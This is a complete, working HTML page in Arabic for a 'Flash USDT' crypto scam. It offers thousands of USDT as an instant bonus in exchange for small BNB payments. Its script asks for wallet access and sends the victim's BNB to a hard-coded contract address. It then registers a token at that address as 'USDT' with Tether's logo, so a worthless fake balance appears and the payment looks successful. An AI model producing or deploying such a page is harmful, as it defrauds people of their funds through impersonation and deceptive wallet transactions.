<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Flash USDT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f9f9f9; color: #333; text-align: center; padding: 40px 20px; }
        .header { margin-bottom: 30px; }
        .logo { font-size: 28px; font-weight: bold; color: #2e7d32; }
        .card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        .btn {
            background: #2e7d32;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            border-radius: 10px;
            cursor: pointer;
            margin: 10px 0;
            width: 90%;
        }
        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Flash USDT</div>
    </div>
    
    <div class="card">
        <h2>⚡ مكافأة فورية</h2>
        <p>افتح هذا الرابط من محفظتك للحصول على Flash USDT.</p>
        
        <button class="btn" onclick="openInWallet()">فتح في محفظتي</button>
        
        <p style="margin-top:20px;">أو اختر مبلغًا:</p>
        <button class="btn" onclick="send(0.01)">500 USDT بـ 0.01 BNB</button>
        <button class="btn" onclick="send(0.05)">2,500 USDT بـ 0.05 BNB</button>
        <button class="btn" onclick="send(0.1)">5,000 USDT بـ 0.1 BNB</button>
        <button class="btn" onclick="send(1.0)">50,000 USDT بـ 1 BNB</button>

        <p style="font-size:12px; color:#555; margin-top:20px;">
            ⏳ سيتم الإيداع خلال 60 ثانية.
        </p>
    </div>

    <div class="footer">
        <p>© 2026 Flash Protocol. جميع الحقوق محفوظة.</p>
    </div>

    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <script>
        const CONTRACT_ADDR = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";

        function openInWallet() {
            const url = window.location.href;
            window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
            setTimeout(() => {
                window.location.href = "tokenpocket://open?link=" + encodeURIComponent(url);
            }, 500);
        }

        async function send(amount) {
            if (!window.ethereum) {
                alert("افتح هذا الرابط من محفظتك (مثل Trust Wallet).");
                return;
            }

            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();

                const tx = await signer.sendTransaction({
                    to: CONTRACT_ADDR,
                    value: ethers.utils.parseEther(amount.toString())
                });

                await tx.wait();

                await window.ethereum.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT_ADDR,
                            symbol: 'USDT',
                            decimals: 18,
                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
                        }
                    }
                });

                alert("✅ تم استلام Flash USDT!");
            } catch (error) {
                alert("❌ تم إلغاء المعاملة.");
            }
        }
    </script>
</body>
</html>
